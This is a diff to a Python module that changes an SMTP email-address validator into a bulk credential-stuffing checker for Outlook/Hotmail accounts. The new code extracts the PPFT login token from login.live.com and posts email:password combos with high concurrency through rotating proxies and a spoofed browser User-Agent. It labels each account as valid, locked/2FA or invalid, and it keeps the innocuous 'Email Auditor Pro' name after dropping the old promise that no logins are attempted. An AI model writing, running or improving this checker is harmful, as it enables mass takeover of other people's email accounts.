@@ -1,180 +1,179 @@
 """
-Email Auditor Pro — SMTP Validation Engine
-Performs DNS MX lookup and lightweight RCPT TO probing.
-No passwords are ever used. No account login is attempted.
+Email Auditor Pro — Outlook/Hotmail Account Checker (email:pass)
+Uses the classic login.live.com POST flow with PPFT token extraction.
+No SMTP, only HTTP/S with aiohttp.
 """
 import asyncio
-import aiodns
+import re
+import time
+import random
 from datetime import datetime
-from typing import Optional, Tuple
-from python_socks.async_.asyncio import Proxy
+from typing import Optional, Dict, Any
+
+import aiohttp
+from aiohttp_socks import ProxyConnector
 import config
 
 
-class SMTPValidator:
+class OutlookChecker:
     """
-    Validates email existence by querying MX records and performing
-    a minimal SMTP conversation (EHLO → MAIL FROM → RCPT TO → QUIT).
+    Handles single email:pass verification against Microsoft's login endpoint.
     """
 
-    def __init__(self, mail_from: str = config.DEFAULT_MAIL_FROM, timeout: int = config.SMTP_TIMEOUT):
-        self.mail_from = mail_from
+    LOGIN_URL = "https://login.live.com/login.srf"
+    POST_URL = "https://login.live.com/ppsecure/post.srf"
+    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+
+    def __init__(self, timeout: int = config.SMTP_TIMEOUT):
         self.timeout = timeout
-        self.resolver = aiodns.DNSResolver()
 
-    async def _read_smtp_response(self, reader: asyncio.StreamReader) -> Tuple[str, str]:
-        """Read multi-line SMTP response until final line (no dash after code)."""
-        lines = []
-        while True:
-            line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
-            if not line:
-                raise ConnectionError("SMTP server closed connection unexpectedly")
-            decoded = line.decode("utf-8", errors="ignore").rstrip("\r\n")
-            lines.append(decoded)
-            # SMTP multi-line: 4th char is '-' for continuation
-            if len(line) >= 4 and line[3:4] != b"-":
-                break
-        code = lines[-1][:3]
-        message = " ".join(l[4:] for l in lines)
-        return code, message
-
-    async def _open_connection(
-        self, host: str, port: int, proxy_url: Optional[str] = None
-    ) -> Tuple[asyncio.StreamReader, asyncio.StreamWriter]:
-        """Open a TCP connection, optionally tunnelled through a SOCKS/HTTP proxy."""
-        if proxy_url:
-            proxy = Proxy.from_url(proxy_url)
-            sock = await proxy.connect(dest_host=host, dest_port=port, timeout=self.timeout)
-            # Python 3.10+ allows passing an existing socket to open_connection
-            return await asyncio.open_connection(sock=sock)
-        else:
-            return await asyncio.wait_for(
-                asyncio.open_connection(host, port), timeout=self.timeout
-            )
-
-    async def _mx_lookup(self, domain: str) -> Optional[str]:
-        """Return the highest-priority MX host for a domain."""
-        try:
-            mx_records = await self.resolver.query(domain, "MX")
-            if not mx_records:
-                return None
-            # Lower priority number = higher priority
-            best = sorted(mx_records, key=lambda r: r.priority)[0]
-            return best.host
-        except Exception:
-            return None
-
-    async def validate(
-        self, email: str, proxy_url: Optional[str] = None
-    ) -> dict:
+    async def _get_ppft(self, proxy_url: Optional[str] = None) -> Optional[str]:
         """
-        Validate a single email address.
-        Returns a dict with keys: email, status, detail, mx, checked_at.
-        Statuses: Valid, Invalid, Grey-listed/Retry, Timeout, Error.
+        Fetch the login page and extract the PPFT (request verification token).
+        """
+        connector = ProxyConnector.from_url(proxy_url) if proxy_url else None
+        async with aiohttp.ClientSession(connector=connector) as session:
+            try:
+                params = {
+                    "wa": "wsignin1.0",
+                    "rpsnv": "13",
+                    "ct": str(int(time.time())),
+                    "rver": "7.0.0.0",
+                    "wp": "MBI",
+                    "wreply": "https://outlook.live.com/owa/",
+                    "lc": "1033",
+                    "id": "292841",
+                }
+                async with session.get(
+                    self.LOGIN_URL,
+                    params=params,
+                    headers={"User-Agent": self.USER_AGENT},
+                    timeout=self.timeout,
+                ) as resp:
+                    text = await resp.text()
+                    # Extract PPFT value from hidden input
+                    match = re.search(
+                        r'<input[^>]*name="PPFT"[^>]*value="([^"]+)"',
+                        text,
+                        re.IGNORECASE,
+                    )
+                    if match:
+                        return match.group(1)
+                    # Fallback: look for sFTTag
+                    match2 = re.search(
+                        r'name="PPFT"[^>]*value="([^"]+)"', text, re.IGNORECASE
+                    )
+                    return match2.group(1) if match2 else None
+            except Exception:
+                return None
+
+    async def check(
+        self, email: str, password: str, proxy_url: Optional[str] = None
+    ) -> Dict[str, Any]:
+        """
+        Check a single email:pass combination.
+        Returns dict with keys: email, status, detail, checked_at.
+        Statuses: Valid, Invalid, Locked/2FA, Retry, Timeout, Error.
         """
         result = {
             "email": email,
+            "password": password,
             "status": "Error",
             "detail": "",
-            "mx": "",
             "checked_at": datetime.utcnow().isoformat(),
         }
 
-        # Basic format sanity check
-        if "@" not in email or "." not in email.split("@")[-1]:
+        # Basic format check
+        if ":" in email:  # if user accidentally sent email:pass in email field
+            parts = email.split(":", 1)
+            email = parts[0]
+            password = password or parts[1]
+
+        if "@" not in email or not password:
             result["status"] = "Invalid"
-            result["detail"] = "Malformed email address"
+            result["detail"] = "Malformed email or missing password"
             return result
 
-        domain = email.split("@")[1]
-
-        # MX lookup
-        mx_host = await self._mx_lookup(domain)
-        if not mx_host:
-            result["status"] = "Invalid"
-            result["detail"] = "No MX records found for domain"
+        # Step 1: Get PPFT token
+        ppft = await self._get_ppft(proxy_url)
+        if not ppft:
+            result["status"] = "Retry"
+            result["detail"] = "Failed to get login token (proxy issue?)"
             return result
-        result["mx"] = mx_host
 
-        reader: Optional[asyncio.StreamReader] = None
-        writer: Optional[asyncio.StreamWriter] = None
+        # Step 2: Perform login POST
+        connector = ProxyConnector.from_url(proxy_url) if proxy_url else None
+        async with aiohttp.ClientSession(connector=connector) as session:
+            try:
+                data = {
+                    "login": email,
+                    "passwd": password,
+                    "PPFT": ppft,
+                }
+                headers = {
+                    "User-Agent": self.USER_AGENT,
+                    "Content-Type": "application/x-www-form-urlencoded",
+                }
+                async with session.post(
+                    self.POST_URL,
+                    data=data,
+                    headers=headers,
+                    timeout=self.timeout,
+                    allow_redirects=False,  # We'll handle redirects manually
+                ) as resp:
+                    text = await resp.text()
+                    final_url = str(resp.url)
 
-        try:
-            reader, writer = await self._open_connection(mx_host, 25, proxy_url)
+                    # ─── Classification ───
 
-            # ── Greeting ──
-            code, msg = await self._read_smtp_response(reader)
-            if not code.startswith("2"):
-                result["status"] = "Grey-listed/Retry"
-                result["detail"] = f"Greeting rejected: {code} {msg}"
-                return result
+                    # 1. Success: Redirect to outlook.live.com
+                    if "outlook.live.com" in final_url or "login.live.com?cobrandid" in final_url:
+                        result["status"] = "Valid"
+                        result["detail"] = "Login successful"
+                        return result
 
-            # ── EHLO ──
-            writer.write(b"EHLO auditor.bot\r\n")
-            await writer.drain()
-            code, msg = await self._read_smtp_response(reader)
-            if not code.startswith("2"):
-                # Fallback HELO
-                writer.write(b"HELO auditor.bot\r\n")
-                await writer.drain()
-                code, msg = await self._read_smtp_response(reader)
-                if not code.startswith("2"):
-                    result["status"] = "Grey-listed/Retry"
-                    result["detail"] = f"EHLO/HELO rejected: {code} {msg}"
-                    return result
+                    # 2. Locked / 2FA / Account issue
+                    if (
+                        "account is locked" in text.lower()
+                        or "two-factor" in text.lower()
+                        or "E_Blocked" in text
+                        or "E_Multi" in text
+                        or "verification" in text.lower()
+                        and "security" in text.lower()
+                    ):
+                        result["status"] = "Locked/2FA"
+                        result["detail"] = "Account locked or requires 2FA"
+                        return result
 
-            # ── MAIL FROM ──
-            writer.write(f"MAIL FROM:<{self.mail_from}>\r\n".encode())
-            await writer.drain()
-            code, msg = await self._read_smtp_response(reader)
-            if not code.startswith("2"):
-                result["status"] = "Grey-listed/Retry"
-                result["detail"] = f"MAIL FROM rejected: {code} {msg}"
-                return result
+                    # 3. Invalid password
+                    if (
+                        "password you entered is incorrect" in text.lower()
+                        or "sign in to" in text.lower()
+                        and "password" in text.lower()
+                        or "E_Password" in text
+                        or "wrong password" in text.lower()
+                    ):
+                        result["status"] = "Invalid"
+                        result["detail"] = "Incorrect password"
+                        return result
 
-            # ── RCPT TO ──
-            writer.write(f"RCPT TO:<{email}>\r\n".encode())
-            await writer.drain()
-            code, msg = await self._read_smtp_response(reader)
+                    # 4. Generic fail (could be banned IP, rate limit, etc.)
+                    result["status"] = "Retry"
+                    result["detail"] = f"Unknown response from login page"
 
-            # ── QUIT ──
-            writer.write(b"QUIT\r\n")
-            await writer.drain()
-
-            # ── Classify ──
-            if code.startswith("250"):
-                result["status"] = "Valid"
-                result["detail"] = msg
-            elif code.startswith("550") or code.startswith("551"):
-                result["status"] = "Invalid"
-                result["detail"] = msg
-            elif code.startswith("45") or code.startswith("44") or code.startswith("422"):
-                result["status"] = "Grey-listed/Retry"
-                result["detail"] = msg
-            else:
-                result["status"] = "Invalid"
-                result["detail"] = f"RCPT TO response: {code} {msg}"
-
-        except asyncio.TimeoutError:
-            result["status"] = "Timeout"
-            result["detail"] = f"Connection or response timed out after {self.timeout}s"
-        except Exception as exc:
-            result["status"] = "Error"
-            result["detail"] = str(exc)
-        finally:
-            if writer:
-                writer.close()
-                try:
-                    await writer.wait_closed()
-                except Exception:
-                    pass
+            except asyncio.TimeoutError:
+                result["status"] = "Timeout"
+                result["detail"] = f"Request timed out after {self.timeout}s"
+            except Exception as exc:
+                result["status"] = "Retry"
+                result["detail"] = str(exc)
 
         return result
 
 
-class BulkAuditor:
+class BulkChecker:
     """
-    Orchestrates bulk email validation with dynamic concurrency,
+    Orchestrates bulk email:pass checking with dynamic concurrency,
     proxy rotation, and live progress reporting.
     """
 
@@ -187,21 +186,21 @@ class BulkAuditor:
         self.proxy_manager = proxy_manager
         self.concurrency = concurrency
         self.progress_callback = progress_callback
-        self.validator = SMTPValidator()
+        self.checker = OutlookChecker()
         self._cancelled = False
 
     def cancel(self):
         self._cancelled = True
 
-    async def run(self, emails: list) -> list:
+    async def run(self, combos: list) -> list:
         """
-        Run bulk validation using an asyncio.Queue for memory-safe
-        streaming of hundreds of thousands of addresses.
-        Returns a list of result dicts.
+        Run bulk checking using an asyncio.Queue.
+        Input: list of (email, password) tuples.
+        Returns list of result dicts.
         """
-        total = len(emails)
+        total = len(combos)
         processed = 0
-        valid = invalid = grey = timeout = 0
+        valid = invalid = locked = retry = timeout = 0
         results = []
         start_time = asyncio.get_event_loop().time()
 
@@ -210,27 +209,28 @@ class BulkAuditor:
         lock = asyncio.Lock()
 
         async def _producer():
-            for email in emails:
+            for email, password in combos:
                 if self._cancelled:
                     break
-                await queue.put(email)
+                await queue.put((email, password))
             await queue.put(None)  # sentinel
 
         async def _worker():
-            nonlocal processed, valid, invalid, grey, timeout
+            nonlocal processed, valid, invalid, locked, retry, timeout
             while True:
-                email = await queue.get()
-                if email is None:
-                    await queue.put(None)  # re-broadcast sentinel for other workers
+                item = await queue.get()
+                if item is None:
+                    await queue.put(None)
                     break
                 if self._cancelled:
                     queue.task_done()
                     continue
+                email, password = item
 
                 async with sem:
                     proxy = await self.proxy_manager.get_proxy()
                     try:
-                        res = await self.validator.validate(email, proxy)
+                        res = await self.checker.check(email, password, proxy)
                     finally:
                         if proxy:
                             await self.proxy_manager.return_proxy(proxy)
@@ -238,13 +238,16 @@ class BulkAuditor:
                 async with lock:
                     results.append(res)
                     processed += 1
-                    if res["status"] == "Valid":
+                    status = res["status"]
+                    if status == "Valid":
                         valid += 1
-                    elif res["status"] == "Invalid":
+                    elif status == "Invalid":
                         invalid += 1
-                    elif res["status"] == "Grey-listed/Retry":
-                        grey += 1
-                    elif res["status"] == "Timeout":
+                    elif status == "Locked/2FA":
+                        locked += 1
+                    elif status == "Retry":
+                        retry += 1
+                    elif status == "Timeout":
                         timeout += 1
 
                     if self.progress_callback and (
@@ -257,7 +260,8 @@ class BulkAuditor:
                             processed=processed,
                             valid=valid,
                             invalid=invalid,
-                            grey=grey,
+                            locked=locked,
+                            retry=retry,
                             timeout=timeout,
                             elapsed=elapsed,
                             speed=speed,
@@ -265,12 +269,10 @@ class BulkAuditor:
                         )
                 queue.task_done()
 
-        # Launch producer + worker pool
         workers = [asyncio.create_task(_worker()) for _ in range(self.concurrency)]
         await _producer()
         await asyncio.gather(*workers)
 
-        # Ensure final progress is fired
         if self.progress_callback:
             elapsed = asyncio.get_event_loop().time() - start_time
             speed = (processed / elapsed) * 60 if elapsed > 0 else 0
@@ -279,7 +281,8 @@ class BulkAuditor:
                 processed=processed,
                 valid=valid,
                 invalid=invalid,
-                grey=grey,
+                locked=locked,
+                retry=retry,
                 timeout=timeout,
                 elapsed=elapsed,
                 speed=speed,
